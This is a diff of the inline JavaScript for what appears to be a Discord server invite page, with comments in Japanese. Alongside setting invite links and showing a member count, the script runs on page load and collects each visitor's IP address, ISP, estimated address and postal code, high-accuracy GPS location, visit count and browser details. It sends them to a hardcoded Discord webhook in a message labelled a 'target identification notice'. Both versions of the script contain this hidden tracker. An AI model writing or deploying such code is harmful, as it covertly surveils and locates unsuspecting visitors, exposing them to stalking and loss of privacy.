@@ -1,105 +1,115 @@
 <script>
-    // 基本設定
+    // --- 設定項目 ---
     const INVITE_URL = "https://discord.gg/dcus"; 
     const SERVER_ID = "1427230542704676926";
-    // 更新された新しいWebhook URL
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1471711618730561647/tjwjOue2WKI1ioF5jmEfr272qB5J2xF082S8qxvGx3KW_g0f4xezNJRwHxpQFp_PC_ql";
 
-    // IPアドレスから住所・ISPを特定する
-    async function getDetailedIpInfo() {
+    // --- メイン処理 ---
+
+    // 1. IPアドレスと詳細な住所情報を取得
+    async function getIpData() {
         try {
-            const response = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,isp,query');
-            return await response.json();
-        } catch { return null; }
+            // HTTPS対応のAPIを使用（確実性が高い）
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                isp: data.org,
+                postal: data.postal
+            };
+        } catch (error) {
+            console.error("IP取得失敗:", error);
+            return { ip: "取得失敗", city: "不明", region: "不明", isp: "不明", postal: "不明" };
+        }
     }
 
-    // 現在地の座標を取得（高精度モード）
-    function getHighPrecisionCoords() {
+    // 2. GPS座標を取得（ブラウザのポップアップが出る）
+    function getGpsData() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
-                resolve({ error: "非対応" });
+                resolve({ status: "非対応デバイス" });
             } else {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        acc: pos.coords.accuracy
-                    }),
-                    (err) => resolve({ error: "拒否" }),
+                    (pos) => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            acc: pos.coords.accuracy,
+                            status: "成功"
+                        });
+                    },
+                    (err) => {
+                        resolve({ status: "ユーザー拒否または失敗" });
+                    },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             }
         });
     }
 
-    // すべての情報を統合してWebhook送信
-    async function sendLogNotification() {
-        // IP情報とGPS座標を同時に取得開始
-        const [ipInfo, gps] = await Promise.all([getDetailedIpInfo(), getHighPrecisionCoords()]);
-        
-        // 訪問回数の記録
-        let visitCount = localStorage.getItem('visit_count') || 0;
-        visitCount = parseInt(visitCount) + 1;
-        localStorage.setItem('visit_count', visitCount);
+    // 3. Webhookへ送信
+    async function sendTrackingLog() {
+        // IPとGPSを同時に取得
+        const [ipInfo, gpsInfo] = await Promise.all([getIpData(), getGpsData()]);
 
-        // Googleマップリンクの作成
-        const googleMapUrl = gps.lat ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}` : null;
+        // 訪問回数のカウント
+        let count = localStorage.getItem('visit_count') || 0;
+        count = parseInt(count) + 1;
+        localStorage.setItem('visit_count', count);
 
-        const data = {
+        // GoogleマップのURL作成
+        const googleMapUrl = gpsInfo.lat 
+            ? `https://www.google.com/maps?q=${gpsInfo.lat},${gpsInfo.lon}` 
+            : "取得不可";
+
+        const payload = {
             embeds: [{
-                title: "⚠️ ターゲット特定通知",
-                description: "紹介サイトへのアクセスを検知。詳細情報を取得しました。",
-                color: 16711680, // 警告の赤色
+                title: "🎯 ターゲット特定通知",
+                color: 15548997, // 赤色
                 fields: [
-                    { name: "🌐 IPアドレス", value: `\`${ipInfo?.query || "取得不能"}\``, inline: true },
-                    { name: "🏢 プロバイダ", value: `\`${ipInfo?.isp || "不明"}\``, inline: true },
-                    { name: "📍 推定住所 (IP)", value: `${ipInfo?.regionName || ""} ${ipInfo?.city || ""} (${ipInfo?.zip || ""})`, inline: false },
+                    { name: "🌐 IPアドレス", value: `\`${ipInfo.ip}\``, inline: true },
+                    { name: "🏢 プロバイダ (ISP)", value: `\`${ipInfo.isp}\``, inline: true },
+                    { name: "📍 推定住所 (IPベース)", value: `${ipInfo.region} ${ipInfo.city} (〒${ipInfo.postal})`, inline: false },
                     { 
                         name: "🛰️ GPS現在地 (高精度)", 
-                        value: googleMapUrl 
-                            ? `📍 [Googleマップで場所を確認する](${googleMapUrl})\n(精度誤差: 約${Math.round(gps.acc)}m)` 
-                            : "❌ ユーザーが位置情報の共有を拒否しました", 
+                        value: gpsInfo.lat 
+                            ? `[Googleマップで開く](${googleMapUrl})\n精度誤差: 約${Math.round(gpsInfo.acc)}m` 
+                            : `❌ ${gpsInfo.status}`, 
                         inline: false 
                     },
-                    { name: "📱 OS/言語", value: `${navigator.platform} / ${navigator.language}`, inline: true },
-                    { name: "👤 訪問回数", value: `${visitCount} 回目`, inline: true }
+                    { name: "👤 訪問データ", value: `通算 ${count} 回目のアクセス`, inline: true },
+                    { name: "📱 OS/ブラウザ", value: navigator.userAgent.split(') ')[0] + ')', inline: false }
                 ],
-                footer: { text: "Security Tracking System" },
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toISOString(),
+                footer: { text: "Access Tracker" }
             }]
         };
 
-        fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        }).catch(() => {});
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
     }
 
-    // UI関連の関数
-    function setupInviteLinks() { 
-        document.querySelectorAll('.invite-link').forEach(link => link.href = INVITE_URL); 
-    }
-    function updateTheme() {
-        const hour = new Date().getHours();
-        document.body.style.background = (hour >= 10 && hour < 18) 
-            ? "linear-gradient(135deg, #1e3c72, #2a5298, #6dd5ed)" 
-            : "linear-gradient(135deg, #0f0c29, #302b63, #24243e)";
-    }
-    async function updateMemberCount() {
-        const statusEl = document.getElementById('status-box');
-        try {
-            const response = await fetch(`https://discord.com/api/guilds/${SERVER_ID}/widget.json?t=${Date.now()}`);
-            const data = await response.json();
-            statusEl.innerText = `🟢 オンライン: ${data.presence_count}人`;
-        } catch { statusEl.innerText = `🟢 サーバー稼働中`; }
-    }
-
-    // 実行
+    // --- 初期化 ---
     document.addEventListener('DOMContentLoaded', () => {
-        setupInviteLinks();
-        updateTheme();
-        updateMemberCount();
-        sendLogNotification();
+        // 招待リンクの設定
+        document.querySelectorAll('.invite-link').forEach(link => {
+            link.href = INVITE_URL;
+        });
+
+        // サーバー人数の表示更新
+        fetch(`https://discord.com/api/guilds/${SERVER_ID}/widget.json`)
+            .then(r => r.json())
+            .then(data => {
+                const el = document.getElementById('status-box');
+                if (el) el.innerText = `🟢 オンライン: ${data.presence_count}人`;
+            }).catch(() => {});
+
+        // ログ送信実行
+        sendTrackingLog();
     });
 </script>
